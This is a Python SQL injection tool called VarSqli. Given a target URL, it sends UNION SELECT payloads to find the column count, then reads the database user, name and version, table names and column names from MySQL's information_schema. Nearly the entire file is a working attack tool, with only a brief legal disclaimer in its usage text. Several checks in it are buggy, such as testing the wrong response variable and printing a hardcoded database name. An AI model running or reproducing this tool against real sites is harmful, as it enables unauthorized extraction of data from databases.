import requests 
import datetime
import time
import colorama
import argparse
import os
from colorama import Fore
from colorama import Style

colorama.init()

def banner():
    starting = datetime.datetime.now().strftime("Starting VarSQLi %H:%M:%S - /%d/%m/%Y")
    print(Fore.YELLOW + Style.BRIGHT + '''
              ___
 _____         H  _____     _ _  {1.1.5}
|  |  |___ ___[,]|   __|___| |_|
|  |  | .'|  _[(]|__   | . | | | {Phamchien}
 \___/|__,|_| [)]|_____|_  |_|_|
               V         |_|   ghostmanews.blogspot.com
''' + Style.RESET_ALL)
    print('''
        VarSqli , Auto Injected MySQL
Hoang Sa, Truong Sa Belong To Vietnam OK
''')
    print(Fore.BLUE + "{}".format(starting) + Style.RESET_ALL)
    print("")
banner()

check_vuln = [
    '%27',
    '*%27',
    '/**8**/%27',
    '**%27',
]
payloads = [
    '/**8**/UNION SELECT ALL 1,2',
    '/**8**/UNION SELECT ALL 1,2,3',
    '/**8**/UNION SELECT ALL 1,2,3,4',
    '/**8**/UNION SELECT ALL 1,2,3,4,5',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20',
]

parser = argparse.ArgumentParser(description="VarSqli - (Variable Sql Injection) Tools V1.1.5")
parser.add_argument('-u', '--url', dest='url', type=str, help='URL Target (ex : https://testphp.vulnweb.com/listproduct?cat=1)')
parser.add_argument('--check-vuln', dest='check', action='store_true', help='Checking Vulnerablity SQL Injection')
parser.add_argument('--check-columns', dest='columns', action='store_true', help='Checking Get Number Columns')
parser.add_argument('--dump-dbs', dest='dbs', action='store_true', help='Checking Get Dbs')

parser.add_argument('--dump-tables', dest='tables', action='store_true', help='Dump DBMS Tables')
parser.add_argument('-T', '--tables-name', dest='name_db', help='Name Database to Testing GET Columns Tables')

parser.add_argument('--dump-columns', dest='column', action='store_true', help='Dump DBMS Columns ')
parser.add_argument('-C', '--columns-name', dest='name_column', help='Name columns DBMS to Testing GET Columns from Tables')
args = parser.parse_args()

URL_TARGET = args.url

if URL_TARGET:
    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Checking Connect HTTP From Target...")
    check_conn = requests.get(URL_TARGET)
    if check_conn.status_code == 200:
        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed")
        time.sleep(1)
        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Status Code {}".format(check_conn.status_code))
        
        if args.check:
            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Checking Vulnerablity SQL Injection...")
            for payload_1 in check_vuln:
                result_1 = requests.get(URL_TARGET + payload_1)
                if "at line" in result_1.text:
                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed")
                    time.sleep(0.20)
                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Target May Be Vulnerable")
                    exit()
                else:
                    end_time = datetime.datetime.now().strftime("%H:%M:%S")
                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Target not Vulnerable")
                    exit("Ending {}".format(end_time))

        if args.columns:
            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Testing Payload UNION SELECT ALL (Number Columns MySQL)")
            num_columns = 1
            for payload_2 in payloads:
                num_columns += 1
                result_2 = requests.get(URL_TARGET + payload_2)
                if str(num_columns) in result_2.text:
                    if "The used SELECT" in result_2.text:
                        print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Testing Payload {}".format(payload_2))
                    else:
                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Completed")
                        print("Parameter : 1")
                        print("     Type : UNION SELECT ALL (Number Columns MySQL)")
                        print("     Title : GETING columns number MySQL")
                        print("     Payload : {}".format(payload_2))
                        print("     URL : {}".format(URL_TARGET))
                        print("     Columns : : {}".format(num_columns))
                        print("")
                        if args.dbs:
                            payload_3 = payload_2.replace("2", "user()")
                            payload_4 = payload_2.replace("2", "database()")
                            payload_5 = payload_2.replace("2", "version()")
                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
                            result_3 = requests.get(URL_TARGET + payload_3)
                            if "The used SELECT" in result_3:
                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
                                exit()
                            else:
                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed User MySQL : {}{}".format(URL_TARGET, payload_3))
                                print("Username MySQL : ")
                                print("      Payload : {}".format(payload_3))
                                print("      URL : {}".format(URL_TARGET))
                                print("")
                                print("      LINK : {}{}".format(URL_TARGET, payload_3))
                                print("")

                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Get database name....")
                            time.sleep(1)
                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
                            result_4 = requests.get(URL_TARGET + payload_4)
                            if "The used SELECT" in result_3:
                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
                                exit()
                            else:
                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_4))
                                print("Username MySQL : ")
                                print("      Payload : {}".format(payload_4))
                                print("      URL : {}".format(URL_TARGET))
                                print("")
                                print("      LINK : {}{}".format(URL_TARGET, payload_4))
                                print("")
                                print("      Name Database 1 : information_schema")
                                print("")
                                
                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Get version MySQL....")
                            time.sleep(1)
                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_3))
                            result_5 = requests.get(URL_TARGET + payload_5)
                            if "The used SELECT" in result_3:
                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
                                exit()
                            else:
                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed database name MySQL : {}{}".format(URL_TARGET, payload_5))
                                print("Username MySQL : ")
                                print("      Payload : {}".format(payload_5))
                                print("      URL : {}".format(URL_TARGET))
                                print("")
                                print("      LINK : {}{}".format(URL_TARGET, payload_5))
                                print("")

                        else:
                            print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-dbs")
                        
                        if args.tables:
                            if args.name_db:
                                query = payload_2.replace("2", "table_name")
                                payload_6 = f"{query} From information_schema.tables where table_schema = '{args.name_db}'"
                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_6))
                                result_6 = requests.get(URL_TARGET, payload_6)
                                if "The used SELECT" in result_6:
                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
                                    exit()
                                else:
                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_6))
                                    print("Username MySQL : ")
                                    print("      Payload : {}".format(payload_6))
                                    print("      URL : {}".format(URL_TARGET))
                                    print("")
                                    print("      LINK : {}{}".format(URL_TARGET, payload_6))
                                    print("")
                                    
                            else:
                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-tables -T < Name DB >")

                        if args.column:
                            if args.name_column:
                                query_1 = payload_2.replace("2", "column_name")
                                payload_7 = f"{query_1} From information_schema.columns where table_schema = '{args.name_column}'"
                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload_7))
                                result_6 = requests.get(URL_TARGET, payload_7)
                                if "The used SELECT" in result_6:
                                    print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Failed")
                                    exit()
                                else:
                                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "URL Bypassing Completed DUMP Database Tables MySQL : {}{}".format(URL_TARGET, payload_7))
                                    print("Username MySQL : ")
                                    print("      Payload : {}".format(payload_7))
                                    print("      URL : {}".format(URL_TARGET))
                                    print("")
                                    print("      LINK : {}{}".format(URL_TARGET, payload_7))
                                    print("")
                                    exit()
                            else:
                                print(Fore.RED + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns --dump-columns -C < Name DB >")
                                
                else:
                    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Failed Get Columns")
                    exit()
        else:
            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Please Agian , command : python3 varsqli.py -u <url> --check-columns")
            exit()
else:  
    print("Usage : python3 varsqli.py -u <url> --check-columns")
    print("Help : python3 varsqli.py --help or -h")
    print('''
[+] Nevertheless, conducting SQL Injection attacks or using the VarSqli tool to attack a system without proper authorization or exceeding legal boundaries may be considered a violation of the law and can result in criminal penalties.
''')
